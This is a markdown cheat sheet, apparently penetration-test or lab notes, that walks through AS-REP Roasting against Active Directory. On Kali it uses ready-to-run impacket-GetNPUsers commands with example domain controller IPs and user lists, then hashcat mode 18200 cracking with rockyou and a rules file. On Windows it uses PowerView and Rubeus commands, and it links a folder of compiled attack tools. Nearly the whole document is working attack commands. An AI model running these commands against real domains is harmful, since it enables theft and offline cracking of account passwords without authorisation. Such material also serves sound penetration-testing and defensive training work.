# AS-REP Roasting
**Kerberos preauthentication** [1](https://learn.microsoft.com/en-us/archive/technet-wiki/23559.kerberos-pre-authentication-why-it-should-not-be-disabled) is the process where a client sends an encrypted _timestamp_ (AS-REQ) to the domain controller to prove its identity. If valid, the domain controller responds with a session key and Ticket Granting Ticket (AS-REP).
## **Perform AS-REP Roasting on Kali:**

1. **Command Syntax**: Use the following command to request the **TGT** (Ticket Granting Ticket) and capture the AS-REP hashes:
    
    ```bash
    impacket-GetNPUsers -dc-ip <DomainController_IP>  -request -outputfile <output_file> <Domain/User>
    ```
- For no password
   ``` bash
    impacket-GetNPUsers -dc-ip <DomainController_IP>  -no-pass -outputfile <output_file> <Domain/User>
   ```
- You have a list of users
  ``` bash
    impacket-GetNPUsers -dc-ip <DomainController_IP>  -no-pass -usersfile <user.lst> -outputfile <output_file> <Domain/>
  ```
    Example:
``` shell
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
impacket-GetNPUsers -dc-ip 10.10.10.192  -no-pass -usersfile user.lst -outputfile hhsh blackfield/
```

2. **Result**: This command will send AS-REQ requests to the domain controller and retrieve the AS-REP hashes (if preauthentication is disabled for the user accounts). The hashes are saved in Hashcat format in the output file (`hashes.asreproast`).
``` shell
hashcat --help | grep -i "Kerberos"
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r rules/best64.rule --force
```
## AS-REP Roasting on Windows (joined domain):
###  Identify Users with Kerberos Preauthentication Disabled on joined windows machine 
First, we run the PowerView `Get-DomainUser` command with the `-PreauthNotRequired` option to find users who have Kerberos preauthentication disabled:
```powershell
Get-DomainUser -PreauthNotRequired
```
By using use _Rubeus_,[4](https://github.com/GhostPack/Rubeus)
Compiled Version [->](https://github.com/MGamalCYSEC/Active-Directory-Enumeration-and-Attacks/tree/main/Tools)

``` powershell
.\Rubeus.exe asreproast /nowrap
```
#### On BloodHound we Discover it as:
![image](https://github.com/user-attachments/assets/aab7c819-2b90-464d-af8e-7b947d8cd596)



